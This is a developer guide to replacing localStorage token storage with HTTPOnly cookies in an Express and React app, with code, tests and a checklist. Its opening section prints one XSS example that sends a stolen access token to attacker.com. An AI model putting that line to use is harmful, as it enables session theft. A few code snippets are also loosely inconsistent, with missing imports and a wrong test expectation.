# HTTPOnly Cookies Implementation Guide

## Current State

**Current Token Storage:** localStorage (vulnerable to XSS)

```javascript
// CURRENT (INSECURE)
localStorage.setItem('accessToken', token);  // Vulnerable to XSS
localStorage.setItem('refreshToken', token); // Can be stolen
```

**Issue:** If an attacker injects JavaScript, they can steal tokens:
```javascript
// Attack: XSS malicious script
fetch('https://attacker.com?token=' + localStorage.getItem('accessToken'));
```

---

## Solution: HTTPOnly + Secure Cookies

**Benefits of HTTPOnly Cookies:**
- ✅ Not accessible from JavaScript (immune to XSS)
- ✅ Sent automatically with requests
- ✅ Only transmitted over HTTPS (Secure flag)
- ✅ SameSite protection against CSRF
- ❌ More complex to implement

---

## Implementation Steps

### Step 1: Backend - Add Token Cookie Routes

**File:** `backend/src/middleware/auth.middleware.ts`

```typescript
import { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';

interface TokenPayload {
  userId: string;
  churchId: string;
  role: string;
}

// Set secure cookies after login
export const setAuthCookies = (
  res: Response,
  accessToken: string,
  refreshToken: string
) => {
  const isProduction = process.env.NODE_ENV === 'production';

  // Access Token Cookie (short-lived, 1 hour)
  res.cookie('accessToken', accessToken, {
    httpOnly: true,              // Not accessible from JavaScript
    secure: isProduction,        // Only HTTPS in production
    sameSite: 'strict',         // CSRF protection
    maxAge: 3600 * 1000,        // 1 hour
    path: '/api',               // Only sent to /api routes
  });

  // Refresh Token Cookie (long-lived, 7 days)
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: isProduction,
    sameSite: 'strict',
    maxAge: 7 * 24 * 3600 * 1000, // 7 days
    path: '/api/auth/refresh',  // Only sent to refresh endpoint
  });
};

// Clear cookies on logout
export const clearAuthCookies = (res: Response) => {
  res.clearCookie('accessToken', { path: '/api' });
  res.clearCookie('refreshToken', { path: '/api/auth/refresh' });
};

// Middleware to extract token from cookies
export const extractTokenFromCookies = (
  req: Request,
  res: Response,
  next: NextFunction
) => {
  const token = req.cookies.accessToken;

  if (token) {
    // Attach token to request for verification
    (req as any).token = token;
  }

  next();
};
```

---

### Step 2: Update Login Route

**File:** `backend/src/routes/auth.routes.ts`

```typescript
import { Router } from 'express';
import { setAuthCookies } from '../middleware/auth.middleware.js';

const router = Router();

// Login endpoint
router.post('/login', async (req, res) => {
  try {
    const { email, password } = req.body;

    // Validate credentials (pseudo-code)
    const user = await validateLogin(email, password);

    if (!user) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    // Generate tokens
    const accessToken = generateAccessToken(user);
    const refreshToken = generateRefreshToken(user);

    // Set HTTPOnly cookies
    setAuthCookies(res, accessToken, refreshToken);

    // Return user info (NOT tokens)
    res.json({
      success: true,
      user: {
        id: user.id,
        email: user.email,
        name: user.name,
      },
      // NOTE: Do NOT return tokens in body
    });
  } catch (error) {
    res.status(500).json({ error: 'Login failed' });
  }
});

// Refresh token endpoint
router.post('/refresh', (req, res) => {
  try {
    const refreshToken = req.cookies.refreshToken;

    if (!refreshToken) {
      return res.status(401).json({ error: 'No refresh token' });
    }

    // Verify and generate new access token
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_SECRET!);
    const newAccessToken = generateAccessToken(decoded);

    // Set new access token cookie
    res.cookie('accessToken', newAccessToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 3600 * 1000, // 1 hour
      path: '/api',
    });

    res.json({ success: true });
  } catch (error) {
    clearAuthCookies(res);
    res.status(401).json({ error: 'Refresh failed' });
  }
});

// Logout endpoint
router.post('/logout', (req, res) => {
  clearAuthCookies(res);
  res.json({ success: true });
});

export default router;
```

---

### Step 3: Update Auth Middleware for Verification

**File:** `backend/src/middleware/jwt.middleware.ts`

```typescript
import { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';

// Middleware to verify JWT from cookies
export const verifyToken = (
  req: Request,
  res: Response,
  next: NextFunction
) => {
  const token = req.cookies.accessToken;

  if (!token) {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET!);
    (req as any).user = decoded;
    next();
  } catch (error) {
    if (error instanceof jwt.TokenExpiredError) {
      // Token expired - try to refresh
      return res.status(401).json({ error: 'Token expired' });
    }
    return res.status(401).json({ error: 'Invalid token' });
  }
};
```

---

### Step 4: Update Backend Express Setup

**File:** `backend/src/app.ts`

```typescript
import express from 'express';
import cookieParser from 'cookie-parser';
import { extractTokenFromCookies } from './middleware/auth.middleware.js';

const app = express();

// Cookie parser middleware (BEFORE routes)
app.use(cookieParser(process.env.COOKIE_SECRET));

// Extract tokens from cookies
app.use(extractTokenFromCookies);

// ... rest of middleware

// Apply to protected routes
app.use('/api/messages', verifyToken, messageRoutes);
app.use('/api/branches', verifyToken, branchRoutes);
// etc.
```

---

### Step 5: Update Frontend - Remove localStorage

**File:** `frontend/src/stores/authStore.ts`

```typescript
import { create } from 'zustand';

interface AuthState {
  user: Admin | null;
  church: Church | null;
  isAuthenticated: boolean;

  setAuth: (user: Admin, church: Church) => void;
  clearAuth: () => void;
  logout: () => Promise<void>;
}

const useAuthStore = create<AuthState>()((set) => ({
  user: null,
  church: null,
  isAuthenticated: false,

  setAuth: (user, church) => {
    // ✅ Tokens are now in HTTPOnly cookies
    // ✅ No need to store in localStorage
    set({
      user,
      church,
      isAuthenticated: true,
    });
  },

  clearAuth: () => {
    set({
      user: null,
      church: null,
      isAuthenticated: false,
    });
  },

  logout: async () => {
    try {
      // Call logout API (clears cookies server-side)
      await fetch('/api/auth/logout', {
        method: 'POST',
        credentials: 'include', // Include cookies in request
      });
    } finally {
      // Clear frontend state
      set({
        user: null,
        church: null,
        isAuthenticated: false,
      });
    }
  },
}));

export default useAuthStore;
```

---

### Step 6: Update API Client Configuration

**File:** `frontend/src/api/client.ts`

```typescript
import axios from 'axios';

const apiClient = axios.create({
  baseURL: import.meta.env.VITE_API_URL || 'http://localhost:3000/api',
  withCredentials: true, // ✅ Include cookies with requests
});

// Request interceptor
apiClient.interceptors.request.use((config) => {
  // ✅ No need to manually add Authorization header
  // Cookies are sent automatically
  return config;
});

// Response interceptor - handle token refresh
apiClient.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    // If token expired and not already retried
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // Call refresh endpoint
        await axios.post('/api/auth/refresh', {}, {
          withCredentials: true, // Include refresh token cookie
        });

        // Retry original request
        return apiClient(originalRequest);
      } catch (refreshError) {
        // Refresh failed - logout
        window.location.href = '/login';
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  }
);

export default apiClient;
```

---

### Step 7: Update Login Component

**File:** `frontend/src/pages/LoginPage.tsx`

```typescript
import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import useAuthStore from '../stores/authStore';

export function LoginPage() {
  const navigate = useNavigate();
  const { setAuth } = useAuthStore();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();

    try {
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include', // ✅ Include cookies
        body: JSON.stringify({ email, password }),
      });

      const data = await response.json();

      if (response.ok) {
        // ✅ Tokens are already in HTTPOnly cookies
        // ✅ Only store user info in state
        setAuth(data.user, data.church);
        navigate('/dashboard');
      } else {
        toast.error(data.error || 'Login failed');
      }
    } catch (error) {
      toast.error('Login failed. Please try again.');
    }
  };

  return (
    // ... form JSX
  );
}
```

---

## Testing HTTPOnly Cookies

### ✅ Test 1: Verify Cookies Are Set

**Steps:**
1. Login to application
2. Open DevTools → Application → Cookies
3. Check if cookies exist under your domain:
   - `accessToken` (1 hour)
   - `refreshToken` (7 days)

**Expected:**
```
Name: accessToken
Value: (hidden) - httpOnly flag prevents access from JS
HttpOnly: ✅ Yes
Secure: ✅ Yes (production only)
SameSite: Strict
Path: /api
```

---

### ❌ Test 2: Verify JavaScript Cannot Access Cookies

**Steps:**
1. Open DevTools → Console
2. Paste:
```javascript
console.log(document.cookie); // Should be empty
localStorage.getItem('accessToken'); // Should be null
```

**Expected Result:**
- ✅ Both return empty/null
- ❌ No tokens accessible from JavaScript

---

### ✅ Test 3: Verify Cookies Sent with Requests

**Steps:**
1. Open DevTools → Network tab
2. Make API request (e.g., GET /api/messages)
3. Check request headers

**Expected:**
```
Cookie: accessToken=...; refreshToken=...
```

---

### ✅ Test 4: Verify Token Refresh

**Steps:**
1. Login successfully
2. Wait 1 hour (or mock time forward)
3. Make API request
4. Should automatically refresh token

**Expected:**
- ✅ New accessToken cookie created
- ✅ Request succeeds (no re-login needed)

---

### ✅ Test 5: Verify Logout Clears Cookies

**Steps:**
1. Login successfully
2. Click Logout
3. Check cookies

**Expected:**
```
accessToken: deleted
refreshToken: deleted
```

---

## Environment Variables

Add to `.env.backend`:

```env
# JWT Configuration
JWT_SECRET=your-jwt-secret-key
REFRESH_SECRET=your-refresh-secret-key
COOKIE_SECRET=your-cookie-secret-key

# Security
NODE_ENV=production
HTTPS=true
```

---

## Migration Path (Current → HTTPOnly)

### Phase 1: Parallel (Both localStorage + HTTPOnly)
```typescript
// Set both temporarily
localStorage.setItem('token', token);  // Old way
setAuthCookies(res, token);            // New way
```

### Phase 2: Backend Transition
- Start setting HTTPOnly cookies
- Keep localStorage temporarily

### Phase 3: Frontend Cleanup
- Update all API calls to use cookies
- Remove localStorage references
- Update auth store

### Phase 4: Deprecation
- Remove localStorage completely
- Monitor for issues

---

## Troubleshooting

| Issue | Cause | Solution |
|-------|-------|----------|
| Cookies not sent | `credentials: 'include'` missing | Add to all fetch/axios calls |
| CORS error | Cookie domain mismatch | Verify CORS origin matches |
| 401 errors | Token refresh failing | Check refresh endpoint |
| Logout not working | Cookies not cleared | Verify clearAuthCookies called |

---

## Security Checklist

Before deployment:

- [ ] HTTPOnly flag enabled for all auth cookies
- [ ] Secure flag enabled in production
- [ ] SameSite=Strict set for all auth cookies
- [ ] Path restricted to `/api`
- [ ] Credentials included in all API requests
- [ ] localStorage cleaned up
- [ ] Token refresh implemented
- [ ] Logout clears cookies
- [ ] Testing completed
- [ ] Production environment variables set

---

## Browser Support

| Feature | Chrome | Firefox | Safari | Edge |
|---------|--------|---------|--------|------|
| HTTPOnly | ✅ | ✅ | ✅ | ✅ |
| Secure | ✅ | ✅ | ✅ | ✅ |
| SameSite | ✅ | ✅ | ✅ | ✅ |

---

## Resources

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#use-httponly-cookie-flag)
- [MDN Cookies Documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [SameSite Cookies Explained](https://web.dev/samesite-cookies-explained/)

---

**Implementation Timeline:** 2-3 sprints
**Complexity:** Medium
**Security Benefit:** High
**Status:** Ready to implement

